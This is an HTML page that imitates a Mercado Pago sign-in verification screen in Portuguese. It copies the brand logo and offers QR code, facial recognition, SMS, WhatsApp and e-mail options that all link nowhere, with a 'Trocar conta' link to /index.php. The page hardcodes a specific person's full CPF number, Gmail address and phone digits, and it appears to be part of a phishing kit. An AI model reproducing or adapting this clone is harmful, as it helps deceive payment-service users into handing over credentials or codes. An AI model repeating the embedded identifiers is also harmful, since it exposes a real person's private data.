<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        /* Reset básico e estilos do Body */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f5f5f5; 
        }

        /* Estilo do cabeçalho principal */
        .main-header {
            background-color: #ffe600;
            padding: 0 48px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }

        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
        .main-content {
            padding-top: 80px; 
            flex-grow: 1;
        }
        
        /* NOVO: Wrapper para centralizar e definir a largura máxima do conteúdo */
        .content-wrapper {
            max-width: 960px;
            margin: 0 auto; /* Centraliza o wrapper na página */
            display: flex;
            justify-content: space-between; /* Empurra as colunas para as extremidades */
            align-items: flex-start;
        }
        
        /* Coluna da Esquerda */
        .left-column {
            display: flex;
            flex-direction: column;
            width: 340px;
        }

        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: #555;
            margin-bottom: 8px;
        }

        .main-title {
            font-size: 28px;
            font-weight: 400;
            color: #333;
            line-height: 1.25;
            margin: 0; 
        }
        
        /* Card de identificação do usuário (corrigido) */
        .user-identifier-box {
            display: flex;
            align-items: center;
            gap: 16px;
            background-color: #ededed;
            border-radius: 8px;
            padding: 16px;
            margin-top: 32px;
        }

        .identifier-text-block {
            display: flex;
            flex-direction: column;
        }

        .identifier-text-block .cpf-text {
            font-size: 16px;
            font-weight: 400;
            color: #333;
        }

        .identifier-text-block .change-account-link {
            font-size: 14px;
            color: #3483fa;
            text-decoration: none;
            margin-top: 4px;
        }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }

        .help-link {
            display: block;
            margin-top: 24px;
            color: #3483fa;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .help-link:hover { text-decoration: underline; }
        
        /* Coluna da Direita (Card de Verificação) */
        .verification-card {
            width: 100%;
            max-width: 500px;
            background-color: #fff;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 16px 0;
            box-sizing: border-box;
        }

        .verification-option {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px 24px;
            text-decoration: none;
            color: inherit;
            border-bottom: 1px solid #ededed;
        }
        .verification-option:last-of-type {
            border-bottom: none;
        }
        .verification-option:hover {
            background-color: #f5f5f5;
        }

        .verification-option .icon-container {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #e3edff;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .verification-option .text-content h3 {
            margin: 0 0 4px 0;
            font-size: 16px;
            font-weight: 500;
        }
        .verification-option .text-content p {
            margin: 0;
            font-size: 14px;
            color: #555;
        }

        .verification-option .chevron-icon {
            margin-left: auto;
        }

        .cant-login-link {
            display: block;
            text-align: center;
            color: #3483fa;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            padding: 24px;
            border-top: 1px solid #ededed;
        }
        .cant-login-link:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
                
                <div class="user-identifier-box">
                    <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#333"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path></svg>
                    <div class="identifier-text-block">
                        <span class="cpf-text">CPF: 288.114.198-67</span>
                        <a href="/index.php" class="change-account-link">Trocar conta</a>
                    </div>
                </div>

                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="verification-card">
                
                <a href="#" class="verification-option">
                    <div class="icon-container">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 11H11V3H3V11ZM5 5H9V9H5V5Z" fill="#3483fa"/><path d="M3 21H11V13H3V21ZM5 15H9V19H5V15Z" fill="#3483fa"/><path d="M13 3V11H21V3H13ZM19 9H15V5H19V9Z" fill="#3483fa"/><path d="M13 13H15V15H13V13Z" fill="#3483fa"/><path d="M15 15H17V17H15V15Z" fill="#3483fa"/><path d="M13 17H15V19H13V17Z" fill="#3483fa"/><path d="M15 17H17V19H15V17Z" fill="#3483fa"/><path d="M17 17H19V19H17V17Z" fill="#3483fa"/><path d="M19 17H21V19H19V17Z" fill="#3483fa"/><path d="M17 15H19V17H17V15Z" fill="#3483fa"/><path d="M19 15H21V17H19V15Z" fill="#3483fa"/><path d="M17 13H19V15H17V13Z" fill="#3483fa"/><path d="M19 13H21V15H19V13Z" fill="#3483fa"/></svg>
                    </div>
                    <div class="text-content">
                        <h3>Código QR</h3>
                        <p>Você vai escanear o código com a câmera do seu celular ou pelo app do Mercado Pago.</p>
                    </div>
                    <div class="chevron-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 9C2 6.79086 3.79086 5 6 5H8M2 15V15C2 17.2091 3.79086 19 6 19H8M16 5H18C20.2091 5 22 6.79086 22 9V9M16 19H18C20.2091 19 22 17.2091 22 15V15M12 14C13.6569 14 15 12.6569 15 11C15 9.34315 13.6569 8 12 8C10.3431 8 9 9.34315 9 11C9 12.6569 10.3431 14 12 14Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M8 11C8 13.2091 9.79086 15 12 15C14.2091 15 16 13.2091 16 11C16 8.79086 14.2091 7 12 7C9.79086 7 8 8.79086 8 11Z" stroke="#3483fa" stroke-width="2"/></svg>
                    </div>
                    <div class="text-content">
                        <h3>Reconhecimento facial</h3>
                        <p>Vamos usar a câmera do seu computador para reconhecer seu rosto.</p>
                    </div>
                    <div class="chevron-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 15C21 15.5304 20.7893 16.0391 20.4142 16.4142C20.0391 16.7893 19.5304 17 19 17H7L3 21V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V15Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="text-content">
                        <h3>SMS</h3>
                        <p>Vamos enviar um código para o telefone terminado em 3819.</p>
                    </div>
                    <div class="chevron-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21.5 17.4C21.5 17.9 21.0523 18.3 20.5 18.3H17.4524C17.0048 18.3 16.5571 18.15 16.1571 17.9L13.7143 16.5C13.3143 16.25 12.8667 16.15 12.4667 16.2C11.519 16.35 10.5238 16.15 9.71429 15.65C7.92857 14.5 6.5 12.9286 5.4 11.1429C4.85 10.2857 4.65 9.28571 4.8 8.33333C4.85 7.93333 4.75 7.48571 4.5 7.08571L3.1 4.64286C2.85 4.24286 2.7 3.79524 2.7 3.34762V2.5C2.7 1.94772 3.1 1.5 3.65 1.5H6.6C6.9 1.5 7.2 1.65 7.4 1.9L8.85 4.3C9.05 4.6 9.1 4.95 9.05 5.25C8.95 5.95 8.95 6.7 9.2 7.35C9.55 8.25 10.15 9.1 10.9 9.85C11.65 10.6 12.55 11.2 13.45 11.55C14.1 11.8 14.85 11.8 15.55 11.7C15.85 11.65 16.2 11.7 16.5 11.9L18.9 13.35C19.15 13.55 19.3 13.85 19.3 14.15V17.1C19.3 17.1 19.3 17.25 19.3 17.25" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="text-content">
                        <h3>WhatsApp</h3>
                        <p>Vamos enviar um código para o telefone terminado em 3819.</p>
                    </div>
                    <div class="chevron-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </a>
                
                <a href="#" class="verification-option">
                    <div class="icon-container">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 4H20C21.1 4 22 4.9 22 6V18C22 19.1 21.1 20 20 20H4C2.9 20 2 19.1 2 18V6C2 4.9 2.9 4 4 4Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 6L12 13L2 6" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="text-content">
                        <h3>E-mail</h3>
                        <p>Vamos enviar um código para nivaldaalmeida22@gmail.com.</p>
                    </div>
                    <div class="chevron-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                    </div>
                </a>
                
                <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
            </div>
        </div>
    </main>

</body>
</html>